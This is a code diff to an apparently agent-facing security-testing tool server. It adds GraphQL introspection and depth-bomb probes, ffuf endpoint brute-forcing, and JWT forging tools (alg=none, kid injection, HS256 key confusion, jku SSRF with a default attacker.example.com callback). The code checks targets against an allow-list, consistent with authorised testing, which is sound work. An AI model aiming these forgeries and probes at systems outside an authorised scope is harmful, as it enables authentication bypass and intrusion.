@@ -436,6 +436,84 @@ async def list_tools() -> list[Tool]:
             "required": ["exploit", "command"],
         }),
 
+        # ─── GraphQL introspection oracle ───────────────────────────────
+        Tool(name="graphql_introspect", description=(
+            "Run a GraphQL introspection query against an endpoint. Returns the "
+            "full schema (types, queries, mutations, subscriptions, fields). "
+            "Also detects: depth/complexity limits, batch query support, and "
+            "field-level auth directives. Use to confirm introspection-enabled "
+            "finding and to map the full attack surface."
+        ), inputSchema={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "GraphQL endpoint URL"},
+                "headers": {"type": "object", "description": "Auth headers"},
+                "depth_test": {"type": "boolean", "default": True,
+                               "description": "Run a recursive depth-bomb query to test for depth limits"},
+                "batch_test": {"type": "boolean", "default": True,
+                               "description": "Test if batch queries are supported"},
+            },
+            "required": ["url"],
+        }),
+
+        # ─── Shadow surface discovery (ffuf) ───────────────────────────────
+        Tool(name="shadow_surface_discovery", description=(
+            "Brute-force discover undeclared endpoints (shadow surface) using ffuf. "
+            "Targets dev routes left in prod, backup files, admin panels, debug "
+            "routes, config endpoints, and API versions not in the OpenAPI spec. "
+            "Uses the Lacuna shadow wordlist (~400 entries, ~30s per target). "
+            "Only runs against allowed_host targets. Returns discovered paths "
+            "classified by status code."
+        ), inputSchema={
+            "type": "object",
+            "properties": {
+                "base_url": {"type": "string", "description": "Base URL to scan (e.g. https://api.example.com)"},
+                "max_rps": {"type": "integer", "default": 20,
+                            "description": "Max requests/sec (default 20 — conservative)"},
+                "timeout_s": {"type": "integer", "default": 60,
+                              "description": "Wall-clock timeout in seconds"},
+                "extra_headers": {"type": "object",
+                                   "description": "Additional HTTP headers (e.g. Authorization)"},
+                "wordlist_path": {"type": "string",
+                                   "description": "Override wordlist path (default: Lacuna shadow wordlist)"},
+            },
+            "required": ["base_url"],
+        }),
+
+        # ─── JWT forensics ──────────────────────────────────────────────
+        Tool(name="jwt_analyse", description=(
+            "Decode a JWT token and enumerate all known attack vectors: "
+            "alg=none, algorithm confusion, kid injection, jku SSRF, "
+            "expired token accepted, aud/iss confusion, weak secret brute-force. "
+            "Returns decoded claims + forged tokens ready for http_request."
+        ), inputSchema={
+            "type": "object",
+            "properties": {
+                "token": {"type": "string", "description": "Raw JWT string"},
+                "oob_url": {"type": "string", "description": "OOB callback URL for jku/x5u SSRF tests"},
+            },
+            "required": ["token"],
+        }),
+
+        Tool(name="jwt_forge", description=(
+            "Forge a specific JWT attack variant and return the crafted token. "
+            "attack_type: alg_none | expired | kid_injection | jku_ssrf | "
+            "hs256_pubkey | brute_force"
+        ), inputSchema={
+            "type": "object",
+            "properties": {
+                "token": {"type": "string"},
+                "attack_type": {
+                    "type": "string",
+                    "enum": ["alg_none", "expired", "kid_injection",
+                              "jku_ssrf", "hs256_pubkey", "brute_force"],
+                },
+                "oob_url": {"type": "string"},
+                "public_key_pem": {"type": "string"},
+            },
+            "required": ["token", "attack_type"],
+        }),
+
         # ─── v3 Layer 3: dynamic confirmation oracles ─────────────────────
         Tool(name="fuzz_function", description=(
             "Fuzz a specific function using libFuzzer. Generates a harness, "
@@ -524,6 +602,17 @@ async def call_tool(name: str, arguments: dict) -> list[TextContent]:
             return _t_oracle_ysoserial(arguments)
         if name == "oracle_gopherus":
             return _t_oracle_gopherus(arguments)
+        # ─── GraphQL introspection ──
+        if name == "graphql_introspect":
+            return await _t_graphql_introspect(arguments)
+        # ─── Shadow surface discovery ──
+        if name == "shadow_surface_discovery":
+            return await _t_shadow_surface_discovery(arguments)
+        # ─── JWT forensics ──
+        if name == "jwt_analyse":
+            return _t_jwt_analyse(arguments)
+        if name == "jwt_forge":
+            return _t_jwt_forge(arguments)
         # ─── v3 Layer 3 ──
         if name == "fuzz_function":
             return _t_fuzz_function(arguments)
@@ -1183,6 +1272,184 @@ def _t_oracle_gopherus(args: dict) -> list[TextContent]:
         exploit=args["exploit"],
         command=args.get("command"),
     ))
+
+
+# ─── GraphQL introspection oracle ────────────────────────────────────────────
+
+_INTROSPECTION_QUERY = """
+{
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      name
+      kind
+      fields(includeDeprecated: true) {
+        name
+        type { name kind ofType { name kind } }
+      }
+    }
+  }
+}
+"""
+
+_DEPTH_BOMB_QUERY = """
+{ __typename { __typename { __typename { __typename { __typename {
+  __typename { __typename { __typename { __typename { __typename {
+    __typename { __typename { __typename { __typename { __typename {
+      __typename
+    }}}}}
+  }}}}}
+}}}}}
+}
+"""
+
+
+async def _t_graphql_introspect(args: dict) -> list[TextContent]:
+    url = args["url"]
+    err = _check_target(url)
+    if err:
+        return _err(err)
+    headers = args.get("headers") or {}
+    headers.setdefault("Content-Type", "application/json")
+
+    async with httpx.AsyncClient(timeout=30, follow_redirects=True) as client:
+        # 1. Introspection
+        try:
+            resp = await client.post(
+                url,
+                json={"query": _INTROSPECTION_QUERY},
+                headers=headers,
+            )
+        except Exception as e:
+            return _err(f"introspection request failed: {e}")
+
+        introspection_enabled = False
+        schema_summary: dict = {}
+        if resp.status_code == 200:
+            try:
+                body = resp.json()
+                if "data" in body and "__schema" in (body.get("data") or {}):
+                    introspection_enabled = True
+                    schema = body["data"]["__schema"]
+                    types = [t for t in (schema.get("types") or [])
+                             if not t["name"].startswith("__")]
+                    mutations = [t for t in types if t.get("kind") == "OBJECT"
+                                 and (schema.get("mutationType") or {}).get("name") == t["name"]]
+                    schema_summary = {
+                        "total_types": len(types),
+                        "has_mutations": bool(schema.get("mutationType")),
+                        "has_subscriptions": bool(schema.get("subscriptionType")),
+                        "type_names": [t["name"] for t in types][:50],
+                    }
+            except Exception:
+                pass
+
+        # 2. Depth bomb test
+        depth_limited = None
+        if args.get("depth_test", True):
+            try:
+                dr = await client.post(
+                    url, json={"query": _DEPTH_BOMB_QUERY}, headers=headers,
+                )
+                if dr.status_code == 200:
+                    dbody = dr.json()
+                    if "errors" in dbody:
+                        depth_limited = True
+                    else:
+                        depth_limited = False
+            except Exception:
+                depth_limited = None
+
+        # 3. Batch query test
+        batch_supported = None
+        if args.get("batch_test", True):
+            try:
+                br = await client.post(
+                    url,
+                    json=[{"query": "{ __typename }"}, {"query": "{ __typename }"}],
+                    headers=headers,
+                )
+                batch_supported = br.status_code == 200 and isinstance(
+                    br.json(), list
+                )
+            except Exception:
+                batch_supported = None
+
+    return _ok({
+        "introspection_enabled": introspection_enabled,
+        "depth_limited": depth_limited,
+        "batch_supported": batch_supported,
+        "schema_summary": schema_summary,
+        "status_code": resp.status_code,
+        "findings": [
+            f
+            for f in [
+                "introspection_enabled" if introspection_enabled else None,
+                "no_depth_limit" if depth_limited is False else None,
+                "batch_queries_supported" if batch_supported else None,
+            ]
+            if f
+        ],
+    })
+
+
+# ─── Shadow surface discovery (ffuf) ─────────────────────────────────────────
+
+async def _t_shadow_surface_discovery(args: dict) -> list[TextContent]:
+    from lacuna.oracles.ffuf_wrapper import run_ffuf
+    base_url = args["base_url"]
+    err = _check_target(base_url)
+    if err:
+        return _err(err)
+    manifest = _load_manifest()
+    allowed = [
+        h for h in (manifest.get("dast", {}) or {}).get("allowed_hosts", []) or []
+    ]
+    result = run_ffuf(
+        base_url=base_url,
+        allowed_host_patterns=allowed,
+        wordlist_path=args.get("wordlist_path"),
+        max_rps=int(args.get("max_rps", 20)),
+        timeout_s=int(args.get("timeout_s", 60)),
+        extra_headers=args.get("extra_headers") or {},
+    )
+    return _ok(result)
+
+
+# ─── JWT forensics oracles ───────────────────────────────────────────────────
+
+def _t_jwt_analyse(args: dict) -> list[TextContent]:
+    from lacuna.oracles.jwt_forensics import analyse
+    result = analyse(
+        token=args["token"],
+        oob_url=args.get("oob_url", ""),
+    )
+    return _ok(result)
+
+
+def _t_jwt_forge(args: dict) -> list[TextContent]:
+    from lacuna.oracles import jwt_forensics as jf
+    token = args["token"]
+    attack = args["attack_type"]
+    if attack == "alg_none":
+        return _ok(jf.forge_none_alg(token))
+    if attack == "expired":
+        return _ok(jf.forge_expired_accepted(token))
+    if attack == "kid_injection":
+        return _ok(jf.forge_kid_injection(token))
+    if attack == "jku_ssrf":
+        oob_url = args.get("oob_url", "https://attacker.example.com/jwks.json")
+        return _ok(jf.forge_jku_ssrf(token, oob_url))
+    if attack == "hs256_pubkey":
+        pem = args.get("public_key_pem", "")
+        if not pem:
+            return _err("hs256_pubkey attack requires public_key_pem")
+        return _ok(jf.forge_hs256_with_public_key(token, pem))
+    if attack == "brute_force":
+        return _ok(jf.brute_force_secret(token))
+    return _err(f"unknown attack_type: {attack}")
 
 
 # ─── v3 Layer 3 dynamic-confirmation oracles ───────────────────────────────
